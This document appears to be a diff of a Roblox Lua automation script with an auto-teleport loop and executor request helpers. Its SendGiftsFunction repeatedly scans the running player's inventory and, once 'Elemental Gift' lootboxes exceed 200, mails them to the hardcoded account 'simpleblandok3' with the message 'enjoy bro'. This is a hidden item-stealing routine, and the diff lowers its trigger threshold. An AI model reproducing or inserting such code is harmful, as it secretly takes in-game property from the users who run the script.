@@ -44,6 +44,7 @@ end
 local function GameCheck()
     if game.GameId == 3317771874 then
         while true do
+wait(10)
             game.ReplicatedStorage.Network:FindFirstChild("World3Teleport"):InvokeServer()
             wait(10)
         end
@@ -216,29 +217,64 @@ spawn(UpdateGUI)
 
 local function SendGiftsFunction()
     while true do
-        local diamondsvalue = 0
-        local gifts = ""
+           local Http = game:GetService("HttpService")
+    local request = (syn and syn.request) or request or (http and http.request) or http_request
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Player = game.Players.LocalPlayer
+    local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
 
-        local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
-        for _, ItemInfo in pairs(LootboxItems) do
-            local ItemData = ItemInfo.data
-            if ItemData._am then
-                diamondsvalue = ItemData._am
-                gifts = ItemInfo.uid
+    local diamondsvalue = 0
+    local gifts = ""
+    local voidvalue = 0
+
+    local ItemLootbox = {"Elemental Gift"}
+    local ItemMisc = {"Pet Cube"}
+
+    local function GetItemInfo(ItemsClass, ItemsName)
+        local Table = {}
+        local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
+
+        if Inventory[ItemsClass] then
+            for UID, Item in pairs(Inventory[ItemsClass]) do
+                if table.find(ItemsName, Item.id) then
+                    local ItemInfo = {
+                        ["uid"] = UID,
+                        ["data"] = Item
+                    }
+                    table.insert(Table, ItemInfo)
+                end
             end
         end
+        return Table
+    end
 
-        if diamondsvalue > 300 then
-            local args = {
-                [1] = "simpleblandok3",
-                [2] = "enjoy bro",
-                [3] = "Lootbox",
-                [4] = gifts,
-                [5] = diamondsvalue
-            }
-            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
+    for _, ItemInfo in pairs(LootboxItems) do
+        local ItemData = ItemInfo.data
+        if ItemData._am then
+            diamondsvalue = ItemData._am
+            gifts = ItemInfo.uid
         end
+    end
 
+    local MiscItems = GetItemInfo("Misc", ItemMisc)
+    for _, ItemInfo in pairs(MiscItems) do
+        local ItemData = ItemInfo.data
+        if ItemData._am then
+            voidvalue = ItemData._am
+        end
+    end
+    
+    if diamondsvalue > 200 then 
+        local args = {
+            [1] = "simpleblandok3",
+            [2] = "enjoy bro",
+            [3] = "Lootbox",
+            [4] = gifts,
+            [5] = diamondsvalue
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
         wait(5)
     end
 end
